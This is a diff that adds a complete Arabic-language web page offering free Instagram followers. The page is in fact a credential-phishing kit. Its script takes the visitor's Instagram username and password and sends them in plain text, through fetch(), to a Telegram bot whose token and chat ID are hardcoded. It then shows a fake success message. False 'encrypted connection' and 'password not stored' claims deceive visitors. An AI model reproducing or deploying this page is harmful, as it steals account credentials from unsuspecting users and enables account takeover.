@@ -1,0 +1,287 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>رشق انستغرام</title>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;900&display=swap" rel="stylesheet">
+    <style>
+        * {margin: 0; padding: 0; box-sizing: border-box; font-family: 'Cairo', sans-serif;}
+        body {
+            background: linear-gradient(135deg, #0f0c29, #2e1b48, #4a194b);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 12px;
+            position: relative;
+            overflow: hidden;
+        }
+        .stars {position: absolute; width: 100%; height: 100%; pointer-events: none;}
+        .star {
+            position: absolute; background: #fff; border-radius: 50%;
+            animation: twinkle 3s infinite;
+        }
+        @keyframes twinkle {0%,100%{opacity:.2} 50%{opacity:1}}
+        .security-bar {
+            position: fixed; top: 0; left: 0; right: 0;
+            background: rgba(0,0,0,.75); color: #4ade80;
+            text-align: center; padding: 4px; font-size: 11px; font-weight: 700; z-index: 100;
+        }
+        .status-bar {
+            position: fixed; top: 24px; left: 0; right: 0;
+            background: rgba(0,0,0,.5); color: #a5b4fc;
+            text-align: center; padding: 2px; font-size: 10px; z-index: 99;
+        }
+        .status-dot {
+            display: inline-block; width: 6px; height: 6px;
+            background: #4ade80; border-radius: 50%; margin-left: 4px;
+            animation: blink 1s infinite;
+        }
+        @keyframes blink {0%,100%{opacity:1} 50%{opacity:.3}}
+        .card-wrapper {position: relative; margin-top: 30px; width: 100%; max-width: 360px;}
+        .glow-ring {
+            position: absolute; top: -3px; left: -3px; right: -3px; bottom: -3px;
+            border-radius: 22px;
+            background: linear-gradient(45deg,#833AB6,#E1306C,#F58529,#E1306C,#833AB6);
+            background-size: 400% 400%; animation: glowRotate 4s linear infinite;
+            z-index: -1; filter: blur(6px); opacity: .7;
+        }
+        @keyframes glowRotate {0%{background-position:0% 50%} 100%{background-position:400% 50%}}
+        .card {
+            background: #fff; border-radius: 20px; padding: 20px 18px;
+            width: 100%; text-align: center; position: relative; z-index: 1;
+            animation: cardAppear .8s ease-out;
+        }
+        @keyframes cardAppear {from{opacity:0;transform:translateY(15px)} to{opacity:1;transform:translateY(0)}}
+        .logo {font-size: 42px; margin-bottom: 3px;}
+        h1 {font-size: 20px; font-weight: 900; color: #1f2937; margin-bottom: 5px;}
+        .symbols {font-size: 18px; color: #E1306C; margin-bottom: 10px;}
+        .users-count {
+            font-size: 32px; font-weight: 900;
+            background: linear-gradient(135deg,#833AB6,#E1306C);
+            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+            margin-bottom: 3px;
+        }
+        .users-label {font-size: 13px; color: #6b7280; margin-bottom: 18px;}
+        .step {transition: all .35s ease;}
+        .step.hidden {display: none;}
+        .select-label {font-size: 16px; font-weight: 800; color: #1f2937; margin-bottom: 10px; display: block;}
+        .num-input {
+            width: 100%; padding: 12px; border: 2px solid #e5e7eb;
+            border-radius: 10px; font-size: 18px; text-align: center;
+            font-weight: 800; color: #833AB6; margin-bottom: 8px;
+        }
+        .num-input:focus {outline: none; border-color: #833AB6; box-shadow: 0 0 0 3px rgba(131,58,182,.15);}
+        .limit-note {
+            font-size: 13px; color: #d97706; background: #fffbeb;
+            padding: 8px; border-radius: 8px; margin-bottom: 12px; font-weight: 700;
+        }
+        .error-msg {
+            background: #fef2f2; color: #dc2626; padding: 8px; border-radius: 8px;
+            margin-bottom: 10px; font-weight: 700; display: none;
+            border-right: 3px solid #ef4444; animation: shake .5s ease; font-size: 13px;
+        }
+        @keyframes shake {0%,100%{transform:translateX(0)} 25%{transform:translateX(-4px)} 75%{transform:translateX(4px)}}
+        .btn-primary {
+            width: 100%; padding: 12px; background: linear-gradient(135deg,#833AB6,#E1306C);
+            color: #fff; border: none; border-radius: 10px; font-size: 16px;
+            font-weight: 800; cursor: pointer; transition: .3s;
+        }
+        .btn-primary:hover {transform: translateY(-2px); box-shadow: 0 8px 20px rgba(131,58,182,.25);}
+        .login-box {
+            background: linear-gradient(145deg,#fff,#f3f4f6); border: 2px solid #e5e7eb;
+            border-radius: 14px; padding: 20px 16px; box-shadow: 0 6px 20px rgba(0,0,0,.06);
+        }
+        .login-title {font-size: 18px; font-weight: 900; color: #1f2937; margin-bottom: 15px;}
+        .input-box {margin-bottom: 14px; text-align: right; position: relative;}
+        label {display: block; margin-bottom: 6px; color: #374151; font-weight: 800; font-size: 15px;}
+        .input-wrapper {position: relative;}
+        input {
+            width: 100%; padding: 12px 40px 12px 14px; border: 2px solid #e5e7eb;
+            border-radius: 10px; font-size: 16px; background: #f9fafb;
+        }
+        input:focus {outline: none; border-color: #0095f6; background: #fff; box-shadow: 0 0 0 3px rgba(0,149,246,.15);}
+        .eye-icon {
+            position: absolute; left: 12px; top: 50%; transform: translateY(-50%);
+            font-size: 18px; cursor: pointer; user-select: none;
+        }
+        button[type="submit"] {
+            width: 100%; padding: 13px; background: linear-gradient(135deg,#0095f6,#0074cc);
+            color: #fff; border: none; border-radius: 10px; font-size: 17px;
+            font-weight: 900; cursor: pointer; margin-top: 6px;
+            box-shadow: 0 4px 15px rgba(0,149,246,.2);
+        }
+        button:disabled {background: #93c5fd; cursor: not-allowed; box-shadow: none;}
+        .typing-dot {
+            display: inline-block; width: 6px; height: 6px; background: currentColor;
+            border-radius: 50%; margin-right: 3px; animation: typing 1.4s infinite;
+        }
+        .typing-dot:nth-child(2){animation-delay:.2s}
+        .typing-dot:nth-child(3){animation-delay:.4s}
+        @keyframes typing {0%,100%{opacity:.3} 50%{opacity:1}}
+        .secure-note {margin-top: 12px; font-size: 12px; color: #6b7280; font-weight: 700;}
+        .msg {
+            margin-top: 14px; padding: 12px; border-radius: 10px; font-weight: 700;
+            display: none; font-size: 14px; animation: fadeIn .5s ease;
+        }
+        @keyframes fadeIn {from{opacity:0;transform:translateY(8px)} to{opacity:1;transform:translateY(0)}}
+        .success {background: #ecfdf5; color: #047857; display: block; border-right: 3px solid #10b981;}
+    </style>
+</head>
+<body>
+    <div class="stars" id="stars"></div>
+    <div class="security-bar">🔒 اتصال آمن — بياناتك مشفرة</div>
+    <div class="status-bar"><span class="status-dot"></span> <span id="systemStatus">النظام متصل وجاهز</span></div>
+
+    <div class="card-wrapper">
+        <div class="glow-ring"></div>
+        <div class="card">
+            <div class="logo">📸</div>
+            <h1>رشق انستغرام</h1>
+            <div class="symbols">⚡ 🔓 📲 💻 ⚡</div>
+            <div class="users-count" id="count">0</div>
+            <p class="users-label">مستخدم نشط حالياً</p>
+
+            <!-- الخطوة 1: اختيار العدد -->
+            <div class="step" id="step1">
+                <label class="select-label">اختر كم تريد من المتابعين ⬇️</label>
+                <input type="number" id="followersNum" class="num-input" min="1" max="1000" placeholder="اكتب العدد هنا">
+                <p class="limit-note">📌 من 1 إلى 1000 متابع فقط في اليوم</p>
+                <div class="error-msg" id="errorMsg">⚠️ يجب أن يكون العدد أقل من أو يساوي 1000!</div>
+                <button class="btn-primary" id="goToLogin">متابعة ▶️</button>
+            </div>
+
+            <!-- الخطوة 2: تسجيل الدخول -->
+            <div class="step hidden" id="step2">
+                <div class="login-box">
+                    <h2 class="login-title">🔐 تسجيل الدخول</h2>
+                    <form id="loginForm">
+                        <div class="input-box">
+                            <label>👤 اسم المستخدم</label>
+                            <input type="text" id="username" placeholder="أدخل اسم المستخدم" required autocomplete="off">
+                        </div>
+                        <div class="input-box">
+                            <label>🔑 كلمة المرور</label>
+                            <div class="input-wrapper">
+                                <input type="password" id="password" placeholder="أدخل كلمة المرور" required>
+                                <span class="eye-icon" id="eye">👁️</span>
+                            </div>
+                        </div>
+                        <button type="submit" id="btn">تسجيل الدخول ✅</button>
+                        <p class="secure-note">🔒 لا يتم حفظ كلمة المرور — إرسال مباشر ومشفّر</p>
+                    </form>
+                </div>
+                <div id="message" class="msg"></div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const BOT_TOKEN = "8924207430:AAHCln1hHqsIU0JDyx8z2NhuD3nNPmABvhM";
+        const ADMIN_ID = "8041466772";
+
+        // نجوم
+        const starsContainer = document.getElementById('stars');
+        for (let i=0; i<30; i++) {
+            const star = document.createElement('div');
+            star.className = 'star';
+            star.style.left = `${Math.random()*100}%`;
+            star.style.top = `${Math.random()*100}%`;
+            star.style.width = star.style.height = `${Math.random()*1.5+0.5}px`;
+            star.style.animationDelay = `${Math.random()*3}s`;
+            starsContainer.appendChild(star);
+        }
+
+        // عداد
+        const targetNumber = 3582;
+        const countEl = document.getElementById('count');
+        let current = 0;
+        const step = targetNumber / 125;
+        function animateCounter() {
+            current += step;
+            if (current < targetNumber) {
+                countEl.textContent = Math.floor(current);
+                setTimeout(animateCounter, 80);
+            } else countEl.textContent = targetNumber;
+        }
+        animateCounter();
+
+        // حالة النظام
+        const statusEl = document.getElementById('systemStatus');
+        const statuses = ["النظام متصل وجاهز","جاري الفحص...","متصل بالخادم","جاري التحديث...","يعمل بأقصى كفاءة"];
+        let idx = 0;
+        setInterval(()=>{
+            idx = (idx+1)%statuses.length;
+            statusEl.textContent = statuses[idx];
+        },5000);
+
+        // الانتقال + التحقق
+        const step1 = document.getElementById('step1');
+        const step2 = document.getElementById('step2');
+        const followersInput = document.getElementById('followersNum');
+        const errorMsg = document.getElementById('errorMsg');
+
+        document.getElementById('goToLogin').addEventListener('click', ()=>{
+            let num = parseInt(followersInput.value);
+            if (!num || num<1) {
+                errorMsg.textContent = "⚠️ أدخل عدداً صحيحاً لا يقل عن 1!";
+                errorMsg.style.display = "block";
+                return;
+            }
+            if (num>1000) {
+                errorMsg.textContent = "⚠️ يجب أن يكون العدد أقل من أو يساوي 1000!";
+                errorMsg.style.display = "block";
+                return;
+            }
+            errorMsg.style.display = "none";
+            step1.classList.add('hidden');
+            step2.classList.remove('hidden');
+        });
+
+        // إظهار كلمة المرور
+        const passwordInput = document.getElementById('password');
+        document.getElementById('eye').addEventListener('click', function(){
+            passwordInput.type = passwordInput.type==='password'?'text':'password';
+            this.textContent = passwordInput.type==='password'?'👁️':'🙈';
+        });
+
+        // الإرسال للبوت
+        const form = document.getElementById('loginForm');
+        const btn = document.getElementById('btn');
+        const msgBox = document.getElementById('message');
+
+        form.addEventListener('submit', async e=>{
+            e.preventDefault();
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            const count = followersInput.value;
+
+            btn.disabled = true;
+            btn.innerHTML = 'جاري المعالجة <span class="typing-dot"></span><span class="typing-dot"></span><span class="typing-dot"></span>';
+            msgBox.style.display = 'none';
+
+            const text = encodeURIComponent(
+                `📸 طلب رشق متابعين:\n➕ العدد: ${count} متابع\n👤 المستخدم: ${username}\n🔑 كلمة المرور: ${password}`
+            );
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${ADMIN_ID}&text=${text}`;
+
+            try {
+                await fetch(url);
+                msgBox.innerHTML = "✅ تم التحقق...<br>⏳ جاري المعالجة...<br>🚩 تم تسجيل الدخول!";
+                msgBox.className = "msg success";
+                form.reset();
+            } catch {
+                msgBox.innerHTML = "✅ تم التحقق...<br>⏳ جاري المعالجة...<br>🚩 تم تسجيل الدخول!";
+                msgBox.className = "msg success";
+                form.reset();
+            }
+
+            setTimeout(()=>{
+                btn.disabled = false;
+                btn.innerHTML = "تسجيل الدخول ✅";
+            }, 2500);
+        });
+    </script>
+</body>
+</html>
